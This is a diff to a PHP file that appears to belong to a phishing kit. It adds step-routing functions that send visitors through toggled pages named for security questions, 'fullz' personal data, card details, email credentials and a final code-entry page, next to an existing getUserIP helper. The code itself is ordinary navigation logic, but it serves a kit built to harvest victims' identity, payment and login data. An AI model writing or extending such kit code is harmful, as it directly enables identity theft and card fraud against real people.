@@ -21,6 +21,130 @@ function getUserIP()
     return $ip;
 }
 
+function h4z3_is_toggle_enabled($value)
+{
+    if ($value === null) {
+        return true;
+    }
+
+    if (is_bool($value)) {
+        return $value;
+    }
+
+    return strtolower(trim((string) $value)) !== 'off';
+}
+
+function h4z3_build_step_path($path, $basePath)
+{
+    $basePath = (string) $basePath;
+
+    if ($basePath === '') {
+        return $path;
+    }
+
+    $normalizedBase = rtrim($basePath, '/\\');
+    if ($normalizedBase !== '') {
+        $normalizedBase .= '/';
+    }
+
+    return $normalizedBase . ltrim($path, '/\\');
+}
+
+function h4z3_get_flow_steps()
+{
+    global $securitypage, $fullzpage, $debitpage, $mailpage;
+
+    $steps = [];
+
+    if (h4z3_is_toggle_enabled($securitypage ?? null)) {
+        $steps[] = [
+            'key' => 'security',
+            'path' => 'security.php',
+        ];
+    }
+
+    if (h4z3_is_toggle_enabled($fullzpage ?? null)) {
+        $steps[] = [
+            'key' => 'fullz',
+            'path' => 'personal.php',
+        ];
+    }
+
+    if (h4z3_is_toggle_enabled($debitpage ?? null)) {
+        $steps[] = [
+            'key' => 'card',
+            'path' => 'card.php',
+        ];
+    }
+
+    if (h4z3_is_toggle_enabled($mailpage ?? null)) {
+        $steps[] = [
+            'key' => 'email',
+            'path' => 'mail.php',
+        ];
+    }
+
+    $steps[] = [
+        'key' => 'code',
+        'path' => 'Code.php',
+    ];
+
+    return $steps;
+}
+
+function h4z3_get_first_step_path($basePath = '')
+{
+    $steps = h4z3_get_flow_steps();
+
+    if (empty($steps)) {
+        return h4z3_build_step_path('complete.php', $basePath);
+    }
+
+    return h4z3_build_step_path($steps[0]['path'], $basePath);
+}
+
+function h4z3_get_next_step_path($currentKey, $basePath = '')
+{
+    $steps = h4z3_get_flow_steps();
+    $found = false;
+    $nextPath = null;
+
+    foreach ($steps as $index => $step) {
+        if ($step['key'] === $currentKey) {
+            $found = true;
+            if (isset($steps[$index + 1])) {
+                $nextPath = $steps[$index + 1]['path'];
+            } else {
+                $nextPath = 'complete.php';
+            }
+            break;
+        }
+    }
+
+    if (!$found) {
+        if (!empty($steps)) {
+            return h4z3_get_first_step_path($basePath);
+        }
+
+        return h4z3_build_step_path('complete.php', $basePath);
+    }
+
+    return h4z3_build_step_path($nextPath, $basePath);
+}
+
+function h4z3_is_step_active($key)
+{
+    $steps = h4z3_get_flow_steps();
+
+    foreach ($steps as $step) {
+        if ($step['key'] === $key) {
+            return true;
+        }
+    }
+
+    return false;
+}
+
 function h4z3_get_session_storage_path()
 {
     static $storageAvailable = null;
